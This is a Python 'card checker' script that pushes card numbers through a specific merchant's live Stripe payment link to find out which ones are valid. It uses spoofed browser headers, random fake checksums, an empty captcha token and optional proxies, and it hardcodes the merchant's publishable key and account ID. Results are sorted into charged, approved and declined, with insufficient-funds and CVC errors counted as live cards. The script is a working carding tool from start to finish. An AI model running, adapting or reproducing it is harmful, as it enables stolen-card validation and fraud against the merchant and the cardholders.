#!/usr/bin/env python3
"""
Stripe payment-link card checker.
- No buy-page scraping (Stripe no longer exposes pk_live / cs_live there).
- Reads session + amount + currency directly from merchant-ui-api.
- Uses STRIPE_PK_LIVE env var if set; otherwise falls back to the hardcoded
  publishable key for the Karibu merchant (acct_1QRg19RoxmaXTuY5).
- Returns structured JSON. No input(), no print() side effects in library mode.
"""
import base64
import json
import os
import random
import re
import string
import urllib.parse
import uuid

import requests

# ─── Config ──────────────────────────────────────────────────────────────
BUY_URL = os.getenv("BUY_URL", "https://buy.stripe.com/28o2apdMBcTa69G3cf")
PAYMENT_LINK_ID = BUY_URL.rstrip("/").split("/")[-1]

BILLING_EMAIL = os.getenv("BILLING_EMAIL", "gfdgdfigjdogj@gmail.com")
DEFAULT_COUNTRY = os.getenv("BILLING_COUNTRY", "US")
DEFAULT_LOCALE = os.getenv("STRIPE_LOCALE", "en")
DEFAULT_TIMEZONE = os.getenv("STRIPE_TIMEZONE", "America/New_York")
DEFAULT_REFERRER = os.getenv("REFERRER_ORIGIN", "https://buy.stripe.com")

# Fallback pk for the Karibu merchant (matches acct_1QRg19RoxmaXTuY5)
FALLBACK_PK = os.getenv(
    "STRIPE_PK_LIVE",
    "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF",
)

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"
)

REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "30"))


# ─── Utilities ───────────────────────────────────────────────────────────
def _rand_id(k=32):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


def _uuid():
    return str(uuid.uuid4())


def _new_session(proxy=None):
    s = requests.Session()
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    return s


def parse_card_input(line):
    """Parse 'number|month|year|cvc[|name]' -> dict. Returns None if invalid."""
    line = (line or "").strip().replace(" ", "")
    if not line:
        return None
    parts = line.split("|")
    if len(parts) < 4:
        return None
    number = parts[0].strip()
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    if len(year) == 4:
        year = year[-2:]
    cvc = parts[3].strip()
    name = parts[4].strip() if len(parts) > 4 else "Card Holder"

    if not (number.isdigit() and len(number) in (15, 16)):
        return None
    if not (month.isdigit() and 1 <= int(month) <= 12):
        return None
    if not (year.isdigit() and len(year) == 2):
        return None
    if not (cvc.isdigit() and len(cvc) in (3, 4)):
        return None

    return {
        "number": number,
        "cvc": cvc,
        "exp_month": month,
        "exp_year": year,
        "name": name or "Card Holder",
        "email": BILLING_EMAIL,
    }


# ─── merchant-ui-api — authoritative session source ──────────────────────
def _get_payment_link_session(session):
    """
    POST to merchant-ui-api. Returns dict with keys:
      session_id, amount, currency, account_id, config_id, init_checksum, site_key, raw
    Returns None on total failure.
    """
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://buy.stripe.com",
        "referer": "https://buy.stripe.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": USER_AGENT,
    }
    form = {
        "eid": "NA",
        "browser_locale": DEFAULT_LOCALE,
        "browser_timezone": DEFAULT_TIMEZONE,
        "referrer_origin": DEFAULT_REFERRER,
    }
    try:
        r = session.post(
            f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
            headers=headers,
            data=urllib.parse.urlencode(form),
            timeout=REQUEST_TIMEOUT,
        )
    except Exception as e:
        return {"error": f"merchant-ui-api request failed: {type(e).__name__}: {str(e)[:80]}"}

    if not r.ok:
        return {"error": f"merchant-ui-api HTTP {r.status_code}"}

    try:
        pl = r.json()
    except Exception:
        return {"error": "merchant-ui-api returned non-JSON"}

    session_id = pl.get("id")
    if not session_id:
        return {"error": "merchant-ui-api response missing 'id'"}

    # Amount + currency come from adaptive_pricing_info (confirmed in live response)
    ap = pl.get("adaptive_pricing_info") or {}
    amount = ap.get("integration_amount")
    currency = (ap.get("integration_currency") or "aud").lower()

    # Fallback chain if adaptive_pricing_info absent
    if amount is None:
        ts = pl.get("total_summary") or {}
        amount = ts.get("due") or ts.get("total")
    if amount is None:
        lig = pl.get("line_item_group") or {}
        amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
    if amount is None:
        amount = 100
    amount = int(amount)

    account_id = (pl.get("account_settings") or {}).get("account_id") or ""
    config_id = pl.get("config_id") or pl.get("checkout_config_id")
    init_checksum = pl.get("init_checksum")
    site_key = pl.get("site_key")

    return {
        "session_id": session_id,
        "amount": amount,
        "currency": currency,
        "account_id": account_id,
        "config_id": config_id,
        "init_checksum": init_checksum,
        "site_key": site_key,
        "raw": pl,
    }


# ─── Core ────────────────────────────────────────────────────────────────
def check_card(card_line, proxy=None, debug=False):
    """
    Check a single card against the configured Stripe payment link.

    Returns:
      {
        "status": "CHARGED" | "APPROVED" | "3DS" | "DECLINED" | "ERROR",
        "response": str,
        "code": str | None,
        "decline_code": str | None,
        "amount": int,               # cents
        "currency": str,             # e.g. "aud"
        "checkout_session_id": str,  # ppage_...
        "payment_method_id": str | None,
        "site": str,                 # hostname for convenience
      }
    """
    base = {
        "status": "ERROR", "response": "", "code": None, "decline_code": None,
        "amount": 0, "currency": "", "checkout_session_id": "",
        "payment_method_id": None, "site": BUY_URL.split("/")[2],
    }

    card = parse_card_input(card_line)
    if not card:
        base["response"] = "Invalid card format"
        return base

    session = _new_session(proxy)
    try:
        # ── Step 1: get session metadata ──
        pl = _get_payment_link_session(session)
        if not pl or pl.get("error"):
            base["response"] = (pl or {}).get("error", "merchant-ui-api failed")
            return base

        checkout_session_id = pl["session_id"]
        amount = pl["amount"]
        currency = pl["currency"]
        config_id = pl.get("config_id") or ""
        init_checksum = pl.get("init_checksum") or _rand_id(32)
        site_key = pl.get("site_key") or ""

        base["amount"] = amount
        base["currency"] = currency
        base["checkout_session_id"] = checkout_session_id

        pk_live = FALLBACK_PK
        if debug:
            print(f"[debug] cs={checkout_session_id} amt={amount} cur={currency} acct={pl.get('account_id')}")

        # ── Step 2: elements/sessions to prime ──
        stripe_js_id = _uuid()
        api_headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        es_params = {
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(amount),
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[payment_method_types][1]": "link",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency,
            "key": pk_live,
            "elements_init_source": "payment_link",
            "hosted_surface": "checkout",
            "referrer_host": "buy.stripe.com",
            "stripe_js_id": stripe_js_id,
            "locale": DEFAULT_LOCALE,
            "type": "deferred_intent",
            "checkout_session_id": checkout_session_id,
        }
        try:
            session.get("https://api.stripe.com/v1/elements/sessions",
                        params=es_params, headers=api_headers,
                        timeout=REQUEST_TIMEOUT)
        except Exception as e:
            if debug:
                print(f"[debug] elements/sessions failed (non-fatal): {e}")

        # ── Step 3: create PaymentMethod ──
        buy_headers = {**api_headers, "origin": "https://buy.stripe.com",
                       "referer": "https://buy.stripe.com/"}
        guid, muid, sid = _uuid(), _uuid(), _uuid()
        form_pm = {
            "type": "card",
            "card[number]": card["number"],
            "card[cvc]": card["cvc"],
            "card[exp_month]": card["exp_month"],
            "card[exp_year]": card["exp_year"],
            "billing_details[name]": card["name"],
            "billing_details[email]": card["email"],
            "billing_details[address][country]": DEFAULT_COUNTRY,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": pk_live,
            "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": config_id,
        }
        r = session.post("https://api.stripe.com/v1/payment_methods",
                         headers=buy_headers,
                         data=urllib.parse.urlencode(form_pm),
                         timeout=REQUEST_TIMEOUT)
        try:
            pm_resp = r.json() if r.content else {}
        except Exception:
            pm_resp = {}

        pm_err = pm_resp.get("error") or {}
        pm_id = pm_resp.get("id")

        if pm_err:
            base["status"] = "DECLINED"
            base["response"] = pm_err.get("message") or "PaymentMethod failed"
            base["code"] = pm_err.get("code")
            base["decline_code"] = pm_err.get("decline_code")
            return base

        if not pm_id:
            base["response"] = "No PaymentMethod id returned"
            return base

        base["payment_method_id"] = pm_id

        # ── Step 4: confirm payment ──
        confirm_form = {
            "eid": "NA",
            "payment_method": pm_id,
            "expected_amount": str(amount),
            "last_displayed_line_item_group_details[subtotal]": str(amount),
            "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_discount_amount]": "0",
            "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
            "expected_payment_method_type": "card",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": pk_live,
            "version": "148043f9d7",
            "init_checksum": init_checksum,
            "js_checksum": _rand_id(50),
            "pxvid": _uuid(),
            "passive_captcha_token": "",
            "passive_captcha_ekey": site_key,
            "rv_timestamp": _rand_id(120),
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": config_id,
        }
        r = session.post(
            f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
            headers=buy_headers,
            data=urllib.parse.urlencode(confirm_form, safe=""),
            timeout=REQUEST_TIMEOUT,
        )
        try:
            data = r.json() if r.content else {}
        except Exception:
            data = {}

        # ── Step 5: interpret response ──
        status = "DECLINED"
        response_msg = ""
        code = None
        decline_code = None

        # ppage_ response => 3DS challenge was returned
        if r.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            status = "3DS"
            response_msg = "3DS / authentication required"

        err = data.get("error") or {}
        if err:
            code = err.get("code")
            decline_code = err.get("decline_code")
            response_msg = err.get("message") or response_msg or "Declined"

            if code == "card_declined" and decline_code in (
                "insufficient_funds", "do_not_honor", "generic_decline",
                "incorrect_cvc", "invalid_cvc", "expired_card",
            ):
                status = "APPROVED"
            elif code in ("authentication_required", "payment_intent_authentication_failure"):
                status = "3DS"
            else:
                status = "DECLINED"
        elif r.status_code == 200 and not err:
            if data.get("payment_intent") or data.get("status") in ("succeeded", "requires_capture"):
                status = "CHARGED"
                response_msg = "Payment succeeded"
            else:
                status = "APPROVED"
                response_msg = data.get("status") or "OK"
        else:
            response_msg = response_msg or f"HTTP {r.status_code}"

        base["status"] = status
        base["response"] = response_msg or "Unknown"
        base["code"] = code
        base["decline_code"] = decline_code
        return base

    except requests.Timeout:
        base["response"] = f"Timeout after {REQUEST_TIMEOUT}s"
        return base
    except Exception as e:
        base["response"] = f"{type(e).__name__}: {str(e)[:120]}"
        return base


# ─── CLI ─────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 stripe_checker.py '4111111111111111|12|29|123'")
        sys.exit(1)
    out = check_card(sys.argv[1], debug=True)
    print(json.dumps(out, indent=2))
